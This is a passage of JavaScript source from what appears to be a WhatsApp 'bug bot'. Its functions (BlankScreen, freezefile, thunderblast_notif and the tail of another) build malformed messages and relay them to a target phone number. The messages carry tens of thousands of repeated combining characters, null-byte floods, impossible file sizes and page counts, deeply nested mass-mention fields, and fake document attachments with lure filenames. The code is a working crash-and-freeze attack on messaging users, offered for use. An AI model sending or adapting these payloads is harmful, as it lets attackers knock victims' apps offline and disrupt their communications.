᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            groupMentions: [
                                {
                                    groupJid: "1@newsletter", 
                                    groupSubject: "UNDEFINED",  
                                    groupMetadata: {
                                        creationTimestamp: 1715880173,  
                                        ownerJid: "owner@newsletter",  
                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
                                    }
                                }
                            ],
                            externalContextInfo: {
                                customTag: "SECURE_PAYBUG_MESSAGE",  
                                securityLevel: "HIGH",  
                                referenceCode: "PAYBUG10291",  
                                timestamp: new Date().toISOString(),  
                                messageId: "MSG00123456789",  
                                userId: "UNDEFINED"  
                            },
                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    Xlesy.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
let virtex = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await Xlesy.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegthumbnail: "https://files.catbox.moe/540elt.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/540elt.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷'))
   	};


async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ြ".repeat(25000);
    await Xlesy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function thunderblast_notif(target) {
			await Xlesy.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegthumbnail: 'https://files.catbox.moe/540elt.jpg',
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷݉